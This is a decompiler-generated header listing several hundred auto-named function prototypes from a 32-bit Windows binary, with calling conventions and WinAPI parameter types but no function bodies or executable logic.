unsigned int __thiscall sub_1001ACF0(_DWORD *this, char a2);
int __thiscall sub_1001AD28(_DWORD *this, _DWORD *a2);
int __thiscall sub_1001AD84(_DWORD *this, int a2);
int __thiscall sub_1001ADC1(_DWORD *this, int a2, int a3);
unsigned int __thiscall sub_1001AE21(_DWORD *this, int a2);
void __thiscall sub_1001AE43(_DWORD *this, void *a2);
// int __userpurge sub_1001AEB1@<eax>(_DWORD *a1@<ebx>, int a2);
void *__thiscall sub_1001AEF3(void *Block, char a2);
void *__thiscall sub_1001AF12(int this);
int __thiscall sub_1001AF77(int *this, _BYTE *a2);
size_t __thiscall sub_1001AFA7(_DWORD *this, _DWORD *a2);
int __thiscall sub_1001B01A(_DWORD *this);
BOOL __thiscall sub_1001B021(void *this);
int __thiscall sub_1001B02C(_DWORD *this, int a2);
void __thiscall sub_1001B064(_DWORD *this);
int __thiscall sub_1001B069(_DWORD *this);
int __thiscall sub_1001B06D(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_1001B0CD(void *this, _DWORD *a2);
void *__thiscall sub_1001B112(void *Block, char a2);
void *__thiscall sub_1001B131(int this);
char __fastcall sub_1001B198(int a1);
bool __thiscall sub_1001B1AC(void *this);
__int16 __thiscall sub_1001B1F3(void *this);
int __thiscall sub_1001B208(void *this);
double __thiscall sub_1001B21C(void *this);
__int64 __thiscall sub_1001B231(void *this);
int __thiscall sub_1001B249(void *this, int a2);
LONG *__thiscall sub_1001B25D(void *this, LONG *a2);
_DWORD *__thiscall sub_1001B341(int *this, _DWORD *a2, char a3);
void __thiscall sub_1001B3C0(_DWORD *this, void *Destination, rsize_t DestinationSize);
int __thiscall sub_1001B492(_BYTE *this);
int __thiscall sub_1001B4C9(_BYTE *this);
int __thiscall nullsub_2(_DWORD); // weak
char __thiscall sub_1001B4DC(_BYTE *this);
void __thiscall sub_1001B4E0(_DWORD *this);
_DWORD *__stdcall sub_1001B526(_DWORD *a1, void *a2);
void __thiscall sub_1001B56C(_DWORD *this);
int __thiscall sub_1001B598(_DWORD *this);
int __thiscall sub_1001B5EA(_DWORD *this);
// void __userpurge sub_1001B63C(int a1@<eax>, int a2);
// int __userpurge sub_1001B666@<eax>(int a1@<eax>, int a2);
int __thiscall sub_1001B67D(_DWORD *this, int a2);
_DWORD *__thiscall sub_1001B76B(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1001B7B6(void *this, _DWORD *a2);
int *__cdecl sub_1001B801(int *a1);
DWORD __fastcall sub_1001B9A0(int a1, int a2, int a3);
DWORD __fastcall sub_1001B9B2(int a1, int a2, int a3);
DWORD __fastcall sub_1001B9C4(char a1, int a2, int a3, int a4);
void __thiscall sub_1001BA98(void *this);
_DWORD *__stdcall sub_1001BAF3(_DWORD *a1);
void *__thiscall sub_1001BB30(_DWORD *this);
_DWORD *__thiscall sub_1001BB96(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1001BBFC(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1001BC62(void *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_1001BCF8(void *this, int a2);
void *__thiscall sub_1001BD3C(void *Block, char a2);
_DWORD *__thiscall sub_1001BD5B(_DWORD *Block, char a2);
void *__stdcall sub_1001BD7A(void *Block);
void __stdcall sub_1001BDAA(int a1);
int __thiscall sub_1001BDD1(_DWORD *this);
int __thiscall sub_1001BE07(_DWORD *this);
int __thiscall sub_1001BE46(_DWORD *this);
void *__thiscall sub_1001BE85(int this);
_DWORD *__thiscall sub_1001BF0D(_DWORD *this, _DWORD *a2);
_DWORD *__stdcall sub_1001BF9A(_DWORD *a1, _DWORD *a2);
_DWORD *__thiscall sub_1001BFD7(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1001BFF7(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7);
int __stdcall sub_1001C041(int a1);
int *__thiscall sub_1001C050(int *this, int *a2);
void *__thiscall sub_1001C0A7(_DWORD *this);
void __thiscall sub_1001C119(_DWORD *this, int a2, unsigned int a3);
int __thiscall sub_1001C1E5(_DWORD *this, unsigned int a2);
int __thiscall sub_1001C252(_DWORD *this, int a2);
int __thiscall sub_1001C273(_DWORD *this, int a2);
void __thiscall sub_1001C294(_DWORD *this, unsigned int a2);
int __thiscall sub_1001C2CF(int *this);
int __thiscall sub_1001C308(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1001C35F(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_1001C3DB(_DWORD *this, int a2, int a3, int a4);
void *__thiscall sub_1001C48B(_DWORD *this);
_DWORD *__thiscall sub_1001C5AD(_DWORD *Block, char a2);
char *__thiscall sub_1001C5CC(char *Block, char a2);
int sub_1001C616();
// void __usercall sub_1001C69F(_DWORD *a1@<edi>);
struct _FILETIME sub_1001C711();
int sub_1001C764();
// int __usercall sub_1001C78D@<eax>(_DWORD *a1@<esi>);
_DWORD *__stdcall sub_1001C7A1(_DWORD *a1, void *a2, char a3);
int *__thiscall sub_1001C7DA(int *Block, char a2);
_DWORD *__cdecl sub_1001C7FA(_DWORD *a1);
int __thiscall sub_1001C834(_DWORD *this, int a2);
int __cdecl sub_1001C871(int a1);
int __cdecl sub_1001C8B1(int a1);
_DWORD *__cdecl sub_1001C9F1(_DWORD *a1);
// _DWORD *__usercall sub_1001CA35@<eax>(DWORD a1@<ebx>, _DWORD *a2, DWORD dwDesiredAccess);
// _DWORD *__userpurge sub_1001CA9C@<eax>(int a1@<edi>, _DWORD *a2);
DWORD __thiscall sub_1001CACF(_DWORD *this);
int __thiscall sub_1001CB48(_DWORD *this);
bool __thiscall sub_1001CC4D(_DWORD *this, UINT uExitCode);
_DWORD *__thiscall sub_1001CCA5(_DWORD *this, _DWORD *a2, DWORD a3);
_DWORD *__thiscall sub_1001CD4A(_DWORD *this, _DWORD *a2);
int __thiscall sub_1001CE3D(void *this, int a2, int a3, int a4);
int __thiscall sub_1001CE7A(_DWORD *this, int a2, SIZE_T dwSize, DWORD flProtect, DWORD flAllocationType);
int __thiscall sub_1001CF16(void *this, int a2, char a3, char a4, char a5);
char __thiscall sub_1001CF87(void *this, int *a2);
_DWORD *__cdecl sub_1001CFF0(_DWORD *a1, int a2, int a3);
_DWORD *__cdecl sub_1001D167(_DWORD *a1, char *a2, char *a3);
_DWORD *__thiscall sub_1001D244(_DWORD *this, _DWORD *a2, int a3, char *a4, char a5, int Block);
_DWORD *__thiscall sub_1001DD0D(_DWORD *this, _DWORD *a2, DWORD DesiredAccess);
DWORD __thiscall sub_1001DD7B(_DWORD *this);
DWORD __thiscall sub_1001DDCA(void *this, int a2);
int __thiscall sub_1001DECF(void *this, int a2, int a3);
int __thiscall sub_1001E54B(int *this, int a2, int a3);
void __cdecl __noreturn sub_1001E569(int pExceptionObject);
_DWORD *__thiscall sub_1001E589(_DWORD *this, int a2);
HMODULE __cdecl sub_1001E5C1(int a1);
char *sub_1001E605(char *lp, ...);
char *sub_1001E665(int a1, ...);
// char *__usercall sub_1001E6BD@<eax>(_DWORD *a1@<esi>);
char *__cdecl sub_1001E6DA(char *lp, LPCSTR lpsz);
_DWORD *__stdcall sub_1001E85D(_DWORD *a1);
_DWORD *__thiscall sub_1001E8C3(_DWORD *Block, char a2);
void __thiscall sub_1001E8E2(_DWORD *this);
void __thiscall sub_1001E8ED(_DWORD *this);
DWORD __cdecl sub_1001E923(HANDLE Handles, int a2);
int __fastcall sub_1001E967(int a1, int a2);
// _DWORD *__userpurge sub_1001EA28@<eax>(int a1@<edi>, _DWORD *a2, int a3, int (__thiscall **a4)(void *Block, char), char pExceptionObject);
_DWORD *__thiscall sub_1001EB8D(_DWORD *this, _DWORD *a2, int a3, char pExceptionObject);
int __stdcall sub_1001EC12(int a1);
int *__thiscall sub_1001EC82(int *Block, char a2);
void __thiscall sub_1001ECA1(int *this);
_DWORD *__stdcall sub_1001ECCD(int a1);
_DWORD *__thiscall sub_1001ECEF(int this);
int __thiscall sub_1001EDD0(int this);
// int __usercall sub_1001EE5B@<eax>(_DWORD *a1@<esi>);
char __thiscall sub_1001EE74(_BYTE *this);
int __stdcall sub_1001EEA4(int a1);
HANDLE *__thiscall sub_1001EF1C(HANDLE *Block, char a2);
int __stdcall sub_1001EF3B(int a1, _DWORD *a2, const WCHAR *a3, LPSECURITY_ATTRIBUTES lpMutexAttributes);
void __thiscall sub_1001EF97(_DWORD *this, _DWORD *a2, int a3, const WCHAR *a4, LPSECURITY_ATTRIBUTES lpMutexAttributes);
void __thiscall sub_1001F16A(HANDLE *this);
int __thiscall sub_1001F1C6(void *this);
char __thiscall sub_1001F1CE(void *this, int a2);
// char __userpurge sub_1001F259@<al>(int a1@<esi>, int a2);
int __thiscall sub_1001F2F7(void *this);
bool __thiscall sub_1001F33A(void *this);
BOOL __thiscall sub_1001F34B(HANDLE *this);
int __thiscall sub_1001F38C(_DWORD *this);
char __thiscall sub_1001F390(_DWORD *this);
_DWORD *__thiscall sub_1001F41B(int this);
// _DWORD *__usercall sub_1001F430@<eax>(_DWORD *a1@<ecx>, int a2@<edi>);
void __cdecl __noreturn sub_1001F47A(int a1, int a2);
_DWORD *__thiscall sub_1001F49C(_DWORD *this, int a2);
// int __userpurge sub_1001F4DD@<eax>(int a1@<edi>, int a2, int a3, _DWORD *a4, int a5, int a6, volatile LONG *lpAddend);
HANDLE *__thiscall sub_1001F567(HANDLE *Block, char a2);
int __stdcall sub_1001F586(int, int, int, volatile LONG *lpAddend); // idb
void __thiscall sub_1001F600(HANDLE *this);
void __thiscall sub_1001F651(int this);
int __thiscall sub_1001F83F(HANDLE *this);
int __thiscall sub_1001F84F(HANDLE *this, FILETIME *a2, int a3);
int __thiscall sub_1001F8AB(HANDLE *this, FILETIME *a2, int a3);
int __thiscall sub_1001F907(_DWORD *this);
BOOL __thiscall sub_1001F93F(_DWORD *this);
int __thiscall sub_1001F94E(void *this, char a2);
int __thiscall sub_1001F968(HANDLE *this, _DWORD *a2);
int __thiscall sub_1001F982(HANDLE *this);
_DWORD *__stdcall sub_1001F992(_DWORD *a1);
_DWORD *__stdcall sub_1001F9CA(_DWORD *a1);
_DWORD *__thiscall sub_1001FA28(_DWORD *this, char a2);
void __thiscall sub_1001FA54(_DWORD *this);
int __thiscall sub_1001FA65(_DWORD *this);
// int __userpurge sub_1001FA9F@<eax>(int a1@<ecx>, int a2@<edi>, int a3, int a4);
void *__thiscall sub_1001FB2B(void *Block, char a2);
int __stdcall sub_1001FB4A(int a1);
int __thiscall sub_1001FBA6(int this);
SIZE_T __thiscall sub_1001FC2F(int this, PMEMORY_BASIC_INFORMATION lpBuffer);
// int __usercall sub_1001FCC0@<eax>(int *a1@<ebx>, int a2@<esi>);
char *__thiscall sub_1001FCEC(char *this);
DWORD __thiscall sub_1001FCF0(void *this);
int __thiscall sub_1001FD04(int this, DWORD flProtect);
int __thiscall sub_1001FDA8(_DWORD *this);
int __thiscall sub_1001FDAF(_DWORD *this, _DWORD *a2);
void __thiscall sub_1001FED1(void *this, char a2);
unsigned int __thiscall sub_1001FF1A(_DWORD *this, unsigned int a2, int a3);
// DWORD __usercall sub_1001FF92@<eax>(int a1@<esi>);
SIZE_T __thiscall sub_1001FFEF(_DWORD *this, _DWORD *nSize);
int __thiscall sub_100200A2(void *this, _BYTE *a2);
BOOL __thiscall sub_10020105(_DWORD *this);
_DWORD *__thiscall sub_1002010F(_DWORD *this, _DWORD *a2, int a3);
void *__thiscall sub_10020188(char *this, char a2);
int __thiscall sub_10020190(_DWORD *this);
unsigned int __thiscall sub_10020198(_DWORD *this, unsigned int a2, int a3);
int __thiscall sub_100201A0(void *this, int a2, char a3);
void *__thiscall sub_100201D0(_BYTE *this);
int __thiscall sub_1002021B(void *this);
int __thiscall sub_10020227(_BYTE *this);
int __thiscall sub_1002024D(void *this);
int __thiscall sub_1002025D(void *this);
int __thiscall sub_1002026D(void *this);
int __thiscall sub_10020279(_DWORD *this);
BOOL __thiscall sub_1002027D(void *this);
int __thiscall sub_100202A4(void *this);
int __thiscall sub_100202EC(void *this, int a2, int a3);
int __thiscall sub_1002033C(void *this, int a2, char a3);
int __thiscall sub_1002036C(_BYTE *this);
int __thiscall sub_100203B7(_BYTE *this);
int __thiscall sub_100203E8(void *this);
int __thiscall sub_100203FF(void *this);
int __thiscall sub_1002040F(void *this);
BOOL __thiscall sub_1002041F(void *this);
int __thiscall sub_10020446(void *this);
int __thiscall sub_1002048E(void *this, int a2, int a3);
int __thiscall sub_100204DE(void *this, int a2, int a3);
int __stdcall sub_1002052F(int a1, DWORD dwMaximumSizeLow, LPCWSTR lpName, int a4, int a5);
_DWORD *__thiscall sub_100206C4(_DWORD *Block, char a2);
bool __thiscall sub_100206E3(_DWORD *this);
int __stdcall sub_1002071F(int a1, int a2, int a3, int a4);
_DWORD *__stdcall sub_10020765(int a1, _DWORD *a2);
_DWORD *__thiscall sub_1002079F(void *this, _DWORD *a2);
_BYTE *__thiscall sub_100207DE(_BYTE *Block, char a2);
void *__thiscall sub_100207FD(_BYTE *this);
int __thiscall sub_1002084E(_DWORD *this, char *a2);
int __thiscall sub_10020891(void *this, _DWORD *a2);
int __thiscall sub_100208F2(_DWORD *this);
char sub_100208F6();
_BYTE *__thiscall sub_100208F9(_BYTE *Block, char a2);
int __thiscall sub_10020918(_BYTE *this);
int __thiscall sub_10020969(_DWORD *this, int a2);
int __thiscall sub_100209A4(void *this, _DWORD *a2);
void __thiscall sub_100209C9(_DWORD *this);
_DWORD *__stdcall sub_100209F2(_DWORD *a1);
int __stdcall sub_10020A26(int a1, int a2);
// char __userpurge sub_10020A7A@<al>(int *a1@<edi>, int a2);
void __thiscall sub_10020AD0(int *this, int a2, volatile LONG *lpAddend);
// int __usercall sub_10020B19@<eax>(int *a1@<edi>);
void __thiscall sub_10020B81(void *); // idb
_DWORD *__stdcall sub_10020BBA(_DWORD *a1, int a2, int a3);
int *__thiscall sub_10020C2A(int *Block, char a2);
void __thiscall sub_10020C49(int *this);
_DWORD *__thiscall sub_10020CA0(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10020CDA(void *this, _DWORD *a2);
// _DWORD *__userpurge sub_10020D14@<eax>(int a1@<edi>, _DWORD *a2);
_DWORD *__stdcall sub_10020D6E(_DWORD *a1, int a2, int a3, int a4);
// _DWORD *__usercall sub_10020DC5@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
_DWORD *__thiscall sub_10020DE6(_DWORD *this, _DWORD *a2);
// unsigned int __usercall sub_10020E8F@<eax>(int a1@<edx>, _DWORD *a2@<esi>);
// bool __usercall sub_10020EC4@<al>(int a1@<edi>, int a2@<esi>);
_DWORD *__stdcall sub_10020EF4(int a1, _DWORD *a2);
_DWORD *__cdecl sub_10020F2E(_DWORD *a1);
DWORD __cdecl sub_1002110D(DWORD dwProcessId);
void **__thiscall sub_10021152(void **Block, char a2);
int __stdcall sub_10021171(int a1, unsigned __int8 *Src);
void __thiscall sub_100211B4(void **this, unsigned __int8 *Src);
void __thiscall sub_1002124C(void **this);
_DWORD *__stdcall sub_10021278(DWORD cchReferencedDomainName, _DWORD *a2);
_DWORD *__stdcall sub_10021411(int a1, _DWORD *a2);
void __thiscall sub_10021494(void **this);
// int __usercall sub_100214CD@<eax>(int a1@<eax>, _DWORD *a2@<edi>);
// void __usercall sub_100214F2(void **a1@<esi>);
int __stdcall sub_10021516(int a1, int a2);
int *__thiscall sub_1002159A(int *Block, char a2);
// int __userpurge sub_100215B9@<eax>(int a1@<edi>, int a2);
void __thiscall sub_100215F9(int *this);
char __thiscall sub_10021625(unsigned __int8 *this, int a2);
int __thiscall sub_1002168B(char *this, int a2, int a3);
_DWORD *__stdcall sub_100216C6(_DWORD *a1);
int __thiscall sub_10021714(int *this, int a2);
int __thiscall sub_100217C1(int *this, int a2);
int *__stdcall sub_1002184E(int *a1, int *a2, int a3);
// int __usercall sub_10021957@<eax>(int a1@<ecx>, int *a2@<ebx>);
// int __usercall sub_100219DF@<eax>(_DWORD *a1@<eax>, int a2@<esi>);
_DWORD *__thiscall sub_10021A18(_DWORD *Block, char a2);
// int __usercall sub_10021A37@<eax>(int a1@<esi>);
int __thiscall sub_10021A57(_DWORD *this);
int *__thiscall sub_10021A97(void *this, int *a2, unsigned int a3);
void __thiscall sub_10021B0B(void *this, int a2);
void __thiscall sub_10021B49(void *this, int a2, int a3);
void __thiscall sub_10021B8A(void *this, int a2);
int __thiscall sub_10021BC8(void *this, int a2);
void __thiscall sub_10021C0C(void *this);
void *__thiscall sub_10021C53(_DWORD *this);
void *__thiscall sub_10021CB9(void *this, int a2);
_DWORD *__thiscall sub_10021CCE(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10021D34(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10021D9A(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10021E00(_DWORD *this, _DWORD *a2);
int *__thiscall sub_10021E66(void *this);
_DWORD *__thiscall sub_10021EAB(_DWORD *Block, char a2);
void *__stdcall sub_10021ECA(void *Block);
void *__thiscall sub_10021EFA(void *Block, char a2);
int *__stdcall sub_10021F19(int *Block);
// int __usercall sub_10021F56@<eax>(int a1@<ecx>, int a2@<esi>);
// void __usercall sub_10021F96(int a1@<ecx>, int a2@<edi>);
int __thiscall sub_10022016(_DWORD *this);
int __thiscall sub_10022055(_DWORD *this);
void *__thiscall sub_10022094(int this);
_DWORD *__thiscall sub_1002211C(_DWORD *this, _DWORD *a2);
BOOL __thiscall sub_100221A9(_DWORD *this);
_DWORD *__thiscall sub_100221B2(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100221D2(_DWORD *this, _DWORD *a2);
void *__thiscall sub_10022228(void *Block, char a2);
_DWORD *__stdcall sub_10022247(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9);
void __thiscall sub_1002228F(void **this);
int sub_100222EA();
_DWORD *__stdcall sub_1002236A(_DWORD *a1, int a2, int a3, LPCWSTR lpName);
_DWORD *__thiscall sub_100223C7(void *this, int a2);
_BYTE *__thiscall sub_100223FA(_BYTE *Block, char a2);
void *__thiscall sub_10022419(_BYTE *this);
void *__thiscall sub_10022442(void *this, int a2, unsigned int a3);
__int16 __thiscall sub_10022497(void *this);
int __thiscall sub_100224AC(void *this);
_DWORD *__thiscall sub_100224C0(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1002256C(_DWORD *Block, char a2);
bool __thiscall sub_1002258C(_DWORD *this);
_DWORD *__thiscall sub_100225C6(_DWORD *Block, char a2);
int __stdcall sub_100225E5(int a1, int a2);
char __thiscall sub_100226D4(_BYTE *this);
DWORD __thiscall sub_100226D8(int this);
int __thiscall sub_1002276B(int this);
void __stdcall __noreturn sub_100227A3(_DWORD); // weak
_DWORD *__thiscall sub_100227C9(_DWORD *Block, char a2);
BOOL __thiscall sub_100227E8(_DWORD *this);
int *__thiscall sub_10022844(int *Block, char a2);
void __thiscall sub_10022863(int *this);
int __stdcall sub_100228A0(int a1);
// DWORD *__userpurge sub_1002295F@<eax>(DWORD *a1@<esi>, DWORD a2);
// int __usercall sub_10022976@<eax>(_DWORD *a1@<esi>);
// bool __usercall sub_10022997@<al>(_DWORD *a1@<eax>);
_DWORD *__stdcall sub_100229B0(_DWORD *a1, int a2);
int *__thiscall sub_10022A31(int *Block, char a2);
void __thiscall sub_10022A50(int *this);
_DWORD *__cdecl sub_10022A79(_DWORD *a1, _DWORD *a2);
BOOL __thiscall sub_10022AD4(_DWORD *this);
BOOL __thiscall sub_10022B15(int this);
int __stdcall sub_10022B77(int a1, int a2);
int *__thiscall sub_10022DDA(int *Block, char a2);
void __thiscall sub_10022DF9(int *this);
_DWORD *__stdcall sub_10022E68(int a1, _DWORD *a2);
_DWORD *__stdcall sub_10022EA2(int a1, _DWORD *a2);
_DWORD *__stdcall sub_10022EDC(int a1, _DWORD *a2);
_DWORD *__stdcall sub_10022F16(int a1, _DWORD *a2);
int __thiscall sub_10022F50(void *this, int a2, int a3, char a4);
int __thiscall sub_10022FE1(unsigned __int8 *this);
_DWORD *__thiscall sub_1002307A(unsigned __int8 *this, _DWORD *a2);
int __thiscall sub_10023120(unsigned __int8 *this);
_DWORD *__thiscall sub_1002317E(_DWORD *Block, char a2);
int __thiscall sub_100231A5(_DWORD *this);
_DWORD *__thiscall sub_100231E4(_DWORD *this, _DWORD *a2);
void __cdecl __noreturn sub_10023241(int pExceptionObject);
// _DWORD *__userpurge sub_10023261@<eax>(int a1@<edi>, _DWORD *a2);
void __thiscall sub_100232D7(int this);
_DWORD *__stdcall sub_10023311(_DWORD *a1, int a2);
int *__thiscall sub_10023377(int *Block, char a2);
void *__thiscall sub_10023396(int *this);
int __stdcall sub_10023406(int *a1);
// int __usercall sub_100234F6@<eax>(_DWORD *a1@<esi>);
void *__thiscall sub_1002359E(_DWORD *this);
int __thiscall sub_10023604(_DWORD *this);
_DWORD *__thiscall sub_10023608(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1002366E(_DWORD *this, _DWORD *a2);
int *__thiscall sub_100236D4(void *this, int *a2, unsigned int a3);
void __thiscall sub_10023748(void *this, int a2);
int __thiscall sub_10023786(void *this, int a2);
_DWORD *__thiscall sub_100237CA(_DWORD *Block, char a2);
int *__stdcall sub_100237E9(int *Block);
int __thiscall sub_10023819(_DWORD *this);
int __thiscall sub_10023858(_DWORD *this);
int *__thiscall sub_10023897(int this);
_DWORD *__thiscall sub_1002391F(_DWORD *this, int a2);
BOOL __thiscall sub_100239AE(_DWORD *this);
_DWORD *__thiscall sub_100239B7(_DWORD *Block, char a2);
_DWORD *__stdcall sub_100239D7(_DWORD *a1, int a2, int a3, int a4, int a5, int a6);
void __stdcall sub_10023A20(int *a1);
int *__thiscall sub_10023A6A(int *Block, char a2);
char sub_10023A8A();
// bool __usercall sub_10023C42@<al>(int a1@<edi>);
void __stdcall sub_10023D4C(int *a1);
_DWORD *__stdcall sub_10023D8F(_DWORD *a1);
void *__thiscall sub_10023DCC(_DWORD *this);
_DWORD *__thiscall sub_10023E32(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10023E98(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10023EFE(_DWORD *Block, char a2);
void **__stdcall sub_10023F1D(void **Block);
int __thiscall sub_10023F4D(_DWORD *this);
int __thiscall sub_10023F8C(_DWORD *this);
void **__thiscall sub_10023FCB(int this);
int *__thiscall sub_10024053(_DWORD *this, int *a2);
_DWORD *__thiscall sub_100240EA(_DWORD *Block, char a2);
int *__stdcall sub_1002410A(int *a1, int a2, volatile LONG *lpAddend, int a4, int a5);
void __stdcall sub_1002415C(void **a1);
// void __usercall sub_10024198(void **a1@<eax>);
void __stdcall sub_100241CB(int a1);
char __cdecl sub_10024200(int a1, int a2, int a3, int a4);
_DWORD *__cdecl sub_10024292(_DWORD *a1, int a2, int a3, unsigned int *a4);
char __cdecl sub_1002434A(int a1, int a2, int a3, int a4);
_DWORD *__stdcall sub_100245AE(_DWORD *a1);
int __stdcall sub_100245E6(int a1, int a2);
int *__thiscall sub_10024766(int *Block, char a2);
void __stdcall sub_10024785(int *a1);
void __thiscall sub_100247A9(int *this);
char __thiscall sub_10024817(_BYTE *this);
unsigned int __thiscall sub_1002481B(int this);
int __thiscall sub_100249DC(_DWORD *this);
_DWORD *__thiscall sub_100249F2(void **this, _DWORD *a2);
void __thiscall __noreturn sub_10024A3D(void *this);
_DWORD *__thiscall sub_10024A61(void *this, _DWORD *a2);
void __thiscall sub_10024AF0(_DWORD *this);
void __noreturn sub_10024AF4();
_DWORD *__thiscall sub_10024B19(_DWORD *this, char a2);
void *__thiscall sub_10024B53(_DWORD *this);
int __thiscall sub_10024B9D(_DWORD *this, _DWORD *a2);
_BYTE *__thiscall sub_10024C04(void *this, int a2, char *a3);
_DWORD *__thiscall sub_10024C1C(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10024C54(_DWORD *this, _DWORD *a2);
int __thiscall sub_10024C8C(_DWORD *this, int a2);
_DWORD *__stdcall sub_10024CA7(_DWORD *a1);
void *__thiscall sub_10024D04(_DWORD *this);
int __thiscall sub_10024D30(_DWORD *this);
int __thiscall sub_10024D3C(_DWORD *this);
int __thiscall sub_10024D48(_DWORD *this, int a2);
int __thiscall sub_10024D7E(_DWORD *this, int a2);
_DWORD *__thiscall sub_10024DB4(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10024DD3(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10024DF2(_DWORD *a1);
void *__stdcall sub_10024E24(_DWORD *a1);
// void *__usercall sub_10024E48@<eax>(int a1@<esi>);
int __stdcall sub_10024E99(int a1, int a2, int a3);
// bool __userpurge sub_10024EF8@<al>(int a1@<esi>, unsigned __int8 *a2);
bool __thiscall sub_10024F94(void *this);
int __thiscall sub_10025092(_BYTE *this);
_DWORD *__stdcall sub_100250DF(_DWORD *a1, int a2, volatile LONG *lpAddend);
// unsigned int __usercall sub_1002519E@<eax>(int a1@<esi>);
void __thiscall sub_10025267(int this);
_DWORD *__stdcall sub_1002539B(_DWORD *a1);
// int __userpurge sub_100253D3@<eax>(int a1@<eax>, unsigned int a2);
// void __usercall sub_1002546C(int *a1@<edi>);
// _DWORD *__userpurge sub_100254EB@<eax>(int a1@<ebx>, _DWORD *a2);
int __thiscall sub_1002554A(int this, _DWORD *a2, unsigned int a3, _DWORD *a4, int a5);
void *__stdcall sub_10025748(int a1, void *a2, unsigned int a3, _DWORD *a4, volatile LONG *lpAddend);
void __cdecl __noreturn sub_10025A05(int pExceptionObject);
_DWORD *__thiscall sub_10025A25(_DWORD *Block, char a2);
int __thiscall sub_10025A4C(int this, int a2);
int __thiscall sub_10025A80(_DWORD *this);
char __thiscall sub_10025A84(_BYTE *this);
int __thiscall sub_10025A88(_BYTE *this);
_DWORD *__thiscall sub_10025A90(int this, _DWORD *a2);
_DWORD *__thiscall sub_10025BE5(int this, _DWORD *a2);
char __thiscall sub_10025D38(void *this);
_DWORD *__cdecl sub_10025F26(_DWORD *a1);
// int __userpurge sub_10026045@<eax>(_DWORD *a1@<edi>, int a2);
// int __usercall sub_100260E5@<eax>(char a1@<al>, int a2@<esi>);
_BYTE *__thiscall sub_1002610F(_BYTE *Block, char a2);
void *__thiscall sub_1002612E(_BYTE *this);
int __thiscall sub_10026173(_BYTE *this);
void *__thiscall sub_1002618A(int this, void *a2, _DWORD *a3, void *a4, _DWORD *a5);
void *__thiscall sub_10026291(int this, void *a2, void *a3);
int __stdcall sub_10026390(int a1);
int __stdcall sub_100263DD(int a1);
char __thiscall sub_1002644B(_BYTE *this);
void __cdecl __noreturn sub_1002644F(int pExceptionObject);
void *__thiscall sub_1002646F(_DWORD *this, void *a2, _DWORD *a3);
_DWORD *__stdcall sub_100265EA(_DWORD *a1, int a2);
// int __usercall sub_1002681B@<eax>(int a1@<eax>, _DWORD *a2@<esi>);
// int __usercall sub_100268BA@<eax>(int a1@<eax>, int a2@<edi>);
int __cdecl sub_10026992(void **a1, int a2);
// int __usercall sub_10027B8E@<eax>(_DWORD **a1@<esi>, int a2, int a3, unsigned int a4, unsigned int *a5, _WORD *a6);
void *__cdecl sub_10027F38(int a1, int a2, int a3);
void __cdecl sub_10027F4B(int a1, void *Block);
// int __usercall sub_10027F59@<eax>(unsigned int a1@<eax>, unsigned __int8 *a2@<ecx>, unsigned int a3);
unsigned int __cdecl sub_10028173(_DWORD *a1, int a2);
// int __usercall sub_1002854F@<eax>(_BYTE *a1@<edx>, int a2, unsigned int a3);
// int __usercall sub_10028568@<eax>(int a1@<eax>, _BYTE *a2@<edx>, unsigned int a3);
void __thiscall sub_100287B9(_BYTE *this);
int __stdcall sub_100287DB(int, int, volatile LONG *lpAddend); // idb
void __thiscall sub_10028845(_DWORD *this);
_DWORD *__thiscall sub_10028887(_DWORD *Block, char a2);
int __stdcall sub_100288A3(int a1);
void __thiscall sub_100288F3(_DWORD *this);
void __thiscall sub_10028920(_DWORD *this, char a2, int a3);
void __thiscall sub_10028950(int this);
_DWORD *__stdcall sub_100289DB(_DWORD *a1);
void __thiscall sub_10028A08(_DWORD *this);
_DWORD *__thiscall sub_10028A2C(_DWORD *Block, char a2);
void __cdecl sub_10028A48(int a1);
_DWORD *__stdcall sub_10028A76(_DWORD *a1);
char __cdecl sub_10028AD3(unsigned int *a1, int a2);
// int __usercall sub_10028DD1@<eax>(_DWORD *a1@<ebp>);
// int *__usercall sub_1002950F@<eax>(int *a1@<ebx>, int a2, int a3, volatile LONG *lpAddend);
void *__stdcall sub_1002960D(_DWORD *a1);
void __thiscall sub_10029657(_DWORD *this);
_DWORD *__thiscall sub_100296AE(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1002970A(_DWORD *this, _DWORD *a2);
int *__thiscall sub_10029766(void *this, int *a2, unsigned int a3);
void __thiscall sub_100297CF(void *this, int a2);
int __thiscall sub_10029807(void *this, int a2);
int __thiscall sub_10029843(_DWORD *this);
void __thiscall sub_1002987A(_DWORD *this);
_DWORD *__thiscall sub_100298D1(void *this, _DWORD *a2);
void __thiscall sub_10029911(void *this, int a2, int a3);
_DWORD *__thiscall sub_1002994C(_DWORD *Block, char a2);
void *__stdcall sub_10029968(void *Block);
_DWORD *__thiscall sub_10029994(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100299B0(_DWORD *Block, char a2);
int __thiscall sub_100299CC(_DWORD *this);
int __thiscall sub_10029A06(_DWORD *this);
void *__thiscall sub_10029A40(int this);
int *__thiscall sub_10029ABF(_DWORD *this, int *a2);
int *__stdcall sub_10029B6B(int *a1, int a2, volatile LONG *lpAddend, int a4, int a5);
// int __userpurge sub_10029BB6@<eax>(__int32 a1@<eax>, int a2);
